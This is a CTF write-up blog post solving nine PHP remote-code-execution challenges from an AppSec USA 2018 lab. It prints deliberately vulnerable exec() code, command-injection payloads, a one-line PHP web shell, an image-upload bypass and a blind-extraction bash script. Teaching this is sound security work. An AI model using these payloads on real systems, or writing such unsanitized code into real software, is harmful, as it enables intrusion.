---
layout: post
title: "RCE Cornucopia - AppSec USA 2018 CTF Solution"
date: 2018-10-21 19:51:38
description: Official solution for AppSec USA's RCE Cornucopia CTF challenge.
tags: CTF AppSecUSA
categories: CTF
twitter_text: Official solution for AppSec USA's RCE Cornucopia CTF challenge.
---

#Running the challenge
All of the challenges in RCE Cornucopia is designed to run in docker. Each challenge runs in it’s own container to prevent one RCE affecting the stability of the other challenges. During a CTF, these containers were rotated out ever 10 seconds. However, to run RCE Cornucopia locally you don’t have to worry about that. To run the challenge, simply create a file name docker-compose.yml with the following contents:

```yaml
version: '3'

services:
  frontend:
    image: dejandayoff/rce_cornucopia_frontend
    ports:
      - 8080:80
  challenge1:
    image: dejandayoff/rce_cornucopia_challenge1
    ports:
      - 8081:80
  challenge2:
    image: dejandayoff/rce_cornucopia_challenge2
    ports:
      - 8082:80
  challenge3:
    image: dejandayoff/rce_cornucopia_challenge3
    ports:
      - 8083:80
  challenge4:
    image: dejandayoff/rce_cornucopia_challenge4
    ports:
      - 8084:80
  challenge5:
    image: dejandayoff/rce_cornucopia_challenge5
    ports:
      - 8085:80
  challenge6:
    image: dejandayoff/rce_cornucopia_challenge6
    ports:
      - 8086:80
  challenge7:
    image: dejandayoff/rce_cornucopia_challenge7
    ports:
      - 8087:80
  challenge8:
    image: dejandayoff/rce_cornucopia_challenge8
    ports:
      - 8088:80
  challenge9:
    image: dejandayoff/rce_cornucopia_challenge9
    ports:
      - 8089:80
```

In the directory with the docker-compose file run:

```docker-compose up```

Note: make sure that nothing is running on the ports listed above or else the challenges won’t be able to start.

If you would like to run this challenge in a CTF environment or you will have multiple users, please contact me. I have automated the full deploy including a method to rotate the containers every 10 seconds to prevent contestants from deleting flags.

#Solutions
##Challenge 1
The first challenge does not attempt to do any kind of sanitization. However, there was client side validation that only allowed a user to submit an ip. To get around this, just submit a valid ip (like 8.8.8.8) and modify the value in the GET request:

http://127.0.0.1:8081/index.php?ip=<b>8.8.8.8&</b>submit=Ping%21

Challenge one allows contestants full freedom to escape the command and read /tmp/flag.txt. Below are a couple of options:

```8.8.8.8; cat /tmp/flag.txt```

```8.8.8.8 %26%26 cat /tmp/flag.txt```

flag{IWasGonnaTellATimeTravellingJokeButYouDidn'tLikeIt}

###Code:
```php
<?php
$command = "ping -c 1 " . $_GET["ip"];

exec($command, $retval);

foreach ($retval as $line) {
    echo $line;
    echo '</br>';
}
?>
```

##Challenge 2
Challenge 2 does not allow for the following characters: “;”, \n, “`", “$", "(", “)”. What is allowed is the “&” and “|” characters. (More info if you are not sure what that is used for https://stackoverflow.com/a/25669618) 

To exploit challenge 2 you will again need to edit the GET request in the URL bar instead of the form. To read flag.txt you could use either of the following:

```google.com %26%26 cat /tmp/flag.txt```

```ADomainThatDoesntExist.com || cat /tmp/flag.txt```

flag{MyThreeFavoriteThingsAreEatingMyFamilyAndNotUsingCommas}

###Code

```php
<?php
$userInput = $_GET["domain"];
$sanitizers = [";",PHP_EOL,"`","$", "(", ")"];
$command = "nslookup " . $userInput;
$safe = false;
foreach($sanitizers as $sanatizer){
    if(strstr(strtolower($userInput), strtolower($sanatizer))!='') {
        echo "Yo! Don't hack me.... please";
        $safe = false;
        break;
    }else{
        $safe = true;
    }
}

if ($safe){
    exec($command,$output);
    foreach ($output as $line) {
        echo $line;
        echo '</br>';
    }
}
?>
```
##Challenge 3
Challenge 3 does not allow for the following characters: “;”,\n,”|","&". This leaves “$”, “(“ and, “)”. Using the service as intended shows you that the whois command is in use. This means that the input has to look like a valid domain. Here is an example of an input that would work to print /tmp/flag.txt:

```$(cat /tmp/flag.txt).com```

Note the “.com” at the end. Without the .com, whois command does not properly work. Whois displays the output in all caps and during the CTF the flag value was case insensitive (this is a RCE challenge not a can-you-get-the-proper-case-for-the-flag challenge). 

flag{IfYourParachuteDoesntDeployYouHaveTheRestOfYourLifeToFixIt}

###Code

```php
<?php
$userInput = $_GET["domain"];
$sanitizers = [";",PHP_EOL,"|","&"];
$command = "whois " . $userInput;
$safe = false;
foreach($sanitizers as $sanatizer){
    if(strstr(strtolower($userInput), strtolower($sanatizer))!='') {
        echo "Yo! Don't hack me.... please";
        $safe = false;
        break;
    }else{
        $safe = true;
    }
}

if ($safe){
    exec($command,$output);
    foreach ($output as $line) {
        echo $line;
        echo '</br>';
    }
}
?>
```

##Challenge 4
Challenge 4 does an Nmap scan on port 80 and 443 of any server that you give it. The service also disallows the following characters: ";","|","&","`","$", "(", “)”. This leaves the new line character. To solve the challenge, the following input would display /tmp/flag.txt:

```google.com%0Acat /tmp/flag.txt```

For obvious reasons, the new line character needs to be encoded to %0A. During the CTF several others were able to solve this challenge by passing the flag file into a script. If this is how you solved it, great job! But you did solve it the more difficult way 😊.

flag{IJustMadeUpANewWord:Plagiarism.}

###Code

```php
<?php
$userInput = $_GET["domain"];
$sanitizers = [";","|","&","`","$", "(", ")"];
$command = "nmap -p 80,443 " . $userInput;
$safe = false;
foreach($sanitizers as $sanatizer){
    if(strstr(strtolower($userInput), strtolower($sanatizer))!='') {
        echo "Yo! Don't hack me.... please";
        $safe = false;
        break;
    }else{
        $safe = true;
    }
}
if ($safe){
    exec($command,$output);
    foreach ($output as $line) {
        echo $line;
        echo '</br>';
    }
}
?>
```

##Challenge 5
Challenge 5 allows you to “scan” a file to check if its a virus or not (all it really did was check if the file ended with a .exe or .dmg 😊). For this challenge you are able to upload any file and re-download it. However, this allows you to upload a PHP back doors. To exploit this, simply upload any file ending in “.php” with the following content:

```<?php exec($_GET["cmd"],$output); print_r($output); ?>```

The command above is a super simple PHP back door that will print the entire output of a command. Once the file is uploaded, visit the file with the link provided and add ```?cmd=cat%20/tmp/flag.txt``` to the end of the request.

flag{RipBoilingWater,YouWillBeMist}

###Code
```php
<?php
$stoage_name = hash('sha256', random_bytes(256));
$currentDir = getcwd();
$uploadDirectory = "/uploads/";

$errors = []; // Store all foreseen and unforseen errors here

$fileExtensions = ['exe','dmg']; // Get all the file extensions

$fileName = $_FILES['userfile']['name'];
$fileSize = $_FILES['userfile']['size'];
$fileTmpName  = $_FILES['userfile']['tmp_name'];
$fileType = $_FILES['userfile']['type'];
$fileExtension = strtolower(end(explode('.',$fileName)));

$uploadPath = $currentDir . $uploadDirectory . $stoage_name . "." . $fileExtension;
$link = $uploadDirectory . $stoage_name . "." . $fileExtension;
if (isset($_POST['submit'])) {

    if (in_array($fileExtension,$fileExtensions)) {
        $errors[] = "This file is a virus!!". "</br>";
    }

    if ($fileSize > 2000000) {
        $errors[] = "This file is more than 2MB. Sorry, it has to be less than or equal to 2MB". "</br>";
    }

    if (empty($errors)) {
        $didUpload = move_uploaded_file($fileTmpName, $uploadPath);

        if ($didUpload) {
            echo "The file " . basename($fileName) . " is not a virus! (I think...)";
            echo "</br>";
            echo "You can download the file <a href='$link'>here</a>";
        } else {
            echo "An error occurred somewhere. Try again or contact the admin". "</br>";
        }
    } else {
        foreach ($errors as $error) {
            echo $error . "These are the errors" . "</br>";
        }
    }
}
?>
```

##Challenge 6
Challenge 6 is very similar to challenge 5, except that challenge 6 checks if the file is an image before processing and uploading it. A quick google search for “php check image type” shows us the following option: http://php.net/manual/en/function.exif-imagetype.php The description states the following: “exif_imagetype() reads the first bytes of an image and checks its signature.” This is exactly the method used for this challenge. Uploading a file with the proper magic numbers for PNG, GIF, JPEG, or JPG would allow the file to bypass the checks and upload to the proper directory. PHP doesn’t care what else is in the file. When it sees the “<?php” and “?>” characters it will execute anything in between. 

To solve this challenge, you can either find out what the magic numbers are and use a hex editor to edit the same shell we uploaded in challenge 5 with the appropriate magic numbers. Or we can do it the ghetto/easy way. Simply download any image (that is less then 2MB), open it in a text editor, go down a couple lines, and place in our Back door:

```<?php exec($_GET["cmd"],$output); print_r($output); ?>```

Don’t forget to rename the image to a “.php”. Once uploaded, visit the page with the appropriate parameter “?cmd=cat%20/tmp/flag.txt” and read the flag!

flag{WhoeverPutThe"B"In"Subtle"WasClever}

###Code
```php
<?php
$stoage_name = hash('sha256', random_bytes(256));
$currentDir = getcwd();
$uploadDirectory = "/uploads/";

$errors = []; // Store all foreseen and unforseen errors here

$fileName = $_FILES['userfile']['name'];
$fileSize = $_FILES['userfile']['size'];
$fileTmpName  = $_FILES['userfile']['tmp_name'];
$fileType = $_FILES['userfile']['type'];
$fileExtension = strtolower(end(explode('.',$fileName)));

$uploadPath = $currentDir . $uploadDirectory . $stoage_name . "." . $fileExtension;
$link = $uploadDirectory . $stoage_name . "." . $fileExtension;

$allowedTypes = array(IMAGETYPE_PNG, IMAGETYPE_JPEG, IMAGETYPE_GIF, IMAGETYPE_JPEG2000 );
$detectedType = exif_imagetype($_FILES['userfile']['tmp_name']);
$error = !in_array($detectedType, $allowedTypes);

$exif = exif_read_data($_FILES['userfile']['tmp_name'], 'EXIF, IFD0');


if (isset($_POST['submit'])) {

    if ($fileSize > 2000000) {
        $errors[] = "This file is more than 2MB. Sorry, it has to be less than or equal to 2MB ". "</br>";
    }

    if (!in_array($detectedType, $allowedTypes)){
        $errors[] = "Sneaky sneaky! I said only images! ". "</br>";
    }

    if (empty($errors)) {
        $didUpload = move_uploaded_file($fileTmpName, $uploadPath);

        if ($didUpload) {
            if ($exif){
                echo '<table>';
                foreach ($exif as $key=>$value) {
                    echo '<tr>' . '<th>';
                    echo $key;
                    echo '</th>' .'<th>';
                    echo $value;
                    echo '</th>'. '</tr>';
                }
                echo '</table>';

            }else{
                echo 'No metadata was found! ';
            }
            echo "You can download the original image <a href='$link'>here </a>";
        } else {
            echo "An error occurred somewhere. Try again or contact the admin ". "</br>";
        }
    } else {
        foreach ($errors as $error) {
            echo $error;
        }
    }
}

?>
```

##Challenge 7
Challenge 7 doesn’t allow for the following characters: "|","&","`","$", "(", “)”. This leaves us only with the “;” character. On top of the characters that are disallowed, the word ”cat” isn’t allowed either. The second problem you will run into with this challenge is, unlike the other commands, the injection point is not at the end of the command. Below is the code snipped of the command:

```“openssl s_client -showcerts -connect ". $userInput . ":443 </dev/null”```

To solve the first problem, you need to use something other then “cat.” A couple of options are to use tac or more. You could find out what commands are or are not allowed by brute forcing a list of possible commands that can read a file. 

To solve the second problem of the injection point not being at the end, you will need to comment out the rest of the command. To do this, just add a %23 (URL encoded “#”) to the end of the injection. Omitting %23 will not necessarily prevent your code from executing but it’s good practice for making debugging easier. For example, if you would run google.com; whoami, you are really running ```whoami:443 </dev/null``` which might give you unexpected errors. 

Putting this together gets us with the following injection:

```google.com; tac /tmp/flag.txt #```

flag{CowsHaveHoovesInsteadOfFeetBecauseTheyLactose}

###Code
```php
<?php
$userInput = $_GET["domain"];
$sanitizers = ["|","&","`","$", "(", ")", "cat"];
$command = "openssl s_client -showcerts -connect ". $userInput . ":443 </dev/null";
$safe = false;
foreach($sanitizers as $sanatizer){
    if(strstr(strtolower($userInput), strtolower($sanatizer))!='') {
        echo "Yo! Don't hack me.... please";
        $safe = false;
        break;
    }else{
        $safe = true;
    }
}
if ($safe){
    exec($command . " 2>&1",$output);
    foreach ($output as $line) {
        echo $line;
        echo '</br>';
    }
}
?>
```

##Challenge 8
Challenge 8 uses the “find” command and blacklists the use of any character that could terminate the command. However, the find command has a “exec” flag that will execute a command for each file that is found (very similar to xargs). The first step to solve challenge 8 is to find a valid user. Any list that contains common names would work to solve this challenge. For the sake of this write-up, we’ll use “Ben”. 

Googling for instructions on how to use the exec command in find shows us that you can use either a “\;” or “+” at the end of the command we want to run (https://unix.stackexchange.com/questions/12902/how-to-run-find-exec). Since the semicolon is a blacklisted character, we will stick with using the plus sign. All thats left is to put it together and read the flag:

```Ben -exec cat /tmp/flag.txt {} %2B```

Don’t forget about encoding the plus sign! Once we run this, we get the flag:

flag{ManWithAuthorityWalksIntoABarAndOrdersEveryoneARound}

###Code
```php
<?php
$userInput = $_GET["user"];
$sanitizers = [";",PHP_EOL,"|","&","`","$", "(", ")"];
$command = "find /tmp/directory/ -type f  -iname ". $userInput  ;
$safe = false;
foreach($sanitizers as $sanatizer){
    if(strstr(strtolower($userInput), strtolower($sanatizer))!='') {
        echo "Yo! Don't hack me.... please";
        $safe = false;
        break;
    }else{
        $safe = true;
    }
}
if ($safe){
    exec($command . " 2>&1",$output);
    if (count($output) == 0){
        echo "No users found by that name";
    }else{
        echo "The following users were found:";
        echo '</br>';
    }
    foreach ($output as $line) {
        echo str_replace("/tmp/directory/","",$line);
        echo '</br>';
    }

}
?>
```

##Challenge 9
Challenge 9 is a blind remote code execution challenge. This challenge was intended to be solved using a script to check for each character in the /tmp/flag.txt file (similar to blind sql injection). This challenge actually didn’t restrict any characters from being used. However, it would only return a “Yaaaaaassssss! It was found” when a command returned a zero (success) and a “Nope” when a command would return a non-zero (failure). If using the tools as intended (for example, looking for the letter “a” in google.com) the command that this challenge runs will look like:

```curl google.com | grep a```

To solve this challenge, the /tmp/flag.txt needs to be broken up letter by letter and checked against a list of possible characters. An easy way to do this is to use the “head” command with the “-c” flag and grep for the string thats expected. All flags start with a lowercase f so to check for that, the following command can be executed: 

```a;cat /tmp/flag.txt | head -c 1 | grep f```

This will return the much desired “Yaaaaaassssss”. This can be used to continue to check for the other values too:

```a;cat /tmp/flag.txt | head -c 2 | grep fl```

```a;cat /tmp/flag.txt | head -c 3 | grep fla```

```a;cat /tmp/flag.txt | head -c 4 | grep flag```

I’ve created the following super-simple script to go check each character against a list of characters in a char.txt file:

```bash
#!/bin/bash

flag="flag%7B"
url="http://127.0.0.1:8089/index.php?url=google.com&string=a;"
i=6
while true; do
    while read char ; do
        echo $flag$char
        curl -s "$url\cat%20/tmp/flag.txt%20|%20head%20-c%20$i%20|%20grep%20$flag$char" | grep "Yaaaaaassssss" &> /dev/null
        if [ $? -eq 0 ]; then
            i=$((i + 1))
            flag="$flag$char"
            echo $flag
            break
        fi
    done < chars.txt
done
```

This is a very simple script and there are many better ways to do this, however, as a POC, this script works. Running this script gets us the following result:

flag{IBeforeEExceptAfterCHasBeenDisprovenByScience}

###Code
```php
<?php
$url = $_GET["url"];
$searchString = $_GET["string"];
echo "Checking if '" . htmlspecialchars($searchString, ENT_QUOTES, 'UTF-8') . "' is found in " . htmlspecialchars($url, ENT_QUOTES, 'UTF-8');
$command = "curl " . $url . "| grep " . $searchString;

exec($command,$output,$success);
echo "</br>";
if($success == 0){
    echo "Yaaaaaassssss! It was found" ;
}else{
    echo "Nope! " . htmlspecialchars($searchString, ENT_QUOTES, 'UTF-8') . " was not found";
}
?>
```

##Conclusion
All of the solutions listed above are the methods that I intended to be used on each challenge. Several people were able to solve the challenges in different methods. If you are able to complete the challenge in a different way, please comment below! I had a lot of fun creating this challenge and appreciate anyone who competed.